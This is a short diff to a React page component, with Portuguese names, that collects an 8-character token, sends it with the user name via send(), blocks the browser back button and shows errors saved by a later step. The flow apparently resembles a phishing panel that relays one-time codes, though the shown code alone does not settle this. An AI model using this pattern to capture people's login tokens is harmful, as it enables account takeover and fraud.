@@ -87,10 +87,18 @@ const FeixePage = () => {
     setErroChave("");
     setEnviandoChave(true);
     send({ acao: "token", usuario, token: chave.join("") });
+    localStorage.setItem("paginaOrigem", "/feixe");
     navigate("/validando");
   };
 
   useEffect(() => {
+    const erroSalvo = localStorage.getItem("erroChave");
+    if (erroSalvo) {
+      setErroChave(erroSalvo);
+      setEnviandoChave(false);
+      setChave(["", "", "", "", "", "", "", ""]);
+      localStorage.removeItem("erroChave");
+    }
     window.history.pushState(null, "", window.location.href);
     const handlePop = () => window.history.pushState(null, "", window.location.href);
     window.addEventListener("popstate", handlePop);
